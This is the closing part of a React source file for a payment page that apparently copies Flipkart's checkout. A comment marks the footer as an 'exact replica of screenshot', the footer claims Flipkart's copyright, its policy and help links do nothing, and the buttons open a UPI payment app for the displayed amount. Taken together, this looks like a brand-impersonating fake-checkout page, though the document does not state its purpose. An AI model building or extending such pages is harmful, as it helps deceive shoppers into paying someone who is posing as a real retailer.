                                {paymentStage === 'pending' ? (
                                    <div className="space-y-2">
                                        <button
                                            type="button"
                                            onClick={() => triggerUpiIntent(activeUpiString)}
                                            className="w-full py-2.5 px-4 rounded bg-[#fb641b] hover:bg-[#e85a14] active:bg-[#d64e0a] text-white font-extrabold text-xs uppercase tracking-wider shadow-sm transition-all text-center flex items-center justify-center cursor-pointer"
                                        >
                                            <span>RE-OPEN PAYMENT APP (₹{finalPayable.toLocaleString()})</span>
                                        </button>
                                        <button
                                            type="button"
                                            onClick={handleComeBackLater}
                                            className="w-full py-2 px-4 rounded bg-white hover:bg-gray-50 border border-gray-300 text-gray-700 font-bold text-xs transition-all text-center flex items-center justify-center cursor-pointer"
                                        >
                                            <span>COME BACK LATER (HOME)</span>
                                        </button>
                                    </div>
                                ) : (
                                    <button
                                        type="button"
                                        onClick={paymentStage === 'confirmed' ? () => navigate('/', { replace: true }) : handleInitiatePayment}
                                        disabled={isProcessing}
                                        className={`w-full py-2.5 px-4 rounded font-extrabold text-xs uppercase tracking-wider shadow-sm transition-all text-center flex items-center justify-center cursor-pointer ${
                                            paymentStage === 'confirmed'
                                                ? 'bg-[#388e3c] hover:bg-[#2e7d32] text-white'
                                                : 'bg-[#fb641b] hover:bg-[#e85a14] text-white'
                                        }`}
                                    >
                                        <span>
                                            {paymentStage === 'confirmed'
                                                ? "CONTINUE SHOPPING"
                                                : `PAY ₹${finalPayable.toLocaleString()}`}
                                        </span>
                                    </button>
                                )}
                            </div>
                        </div>

                    </div>
                </div>
            </main>

            {/* 4. BOTTOM FOOTER (EXACT REPLICA OF SCREENSHOT) */}
            <footer className={`mt-8 pt-4 pb-12 border-t border-gray-200 text-xs text-gray-500 select-none ${paymentStage === 'pending' ? 'hidden sm:block' : ''}`}>
                <div className="max-w-6xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-3 text-center sm:text-left">
                    <div>
                        <span>Policies: </span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Returns Policy</span>
                        <span className="mx-1">|</span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Terms of use</span>
                        <span className="mx-1">|</span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Security</span>
                        <span className="mx-1">|</span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Privacy</span>
                    </div>

                    <div>
                        <span>© 2007-2026 Flipkart.com</span>
                    </div>

                    <div>
                        <span>Need help? Visit the </span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Help Center</span>
                        <span> or </span>
                        <span onClick={(e) => e.preventDefault()} className="text-[#2874f0] hover:underline cursor-pointer">Contact Us</span>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default Payment;
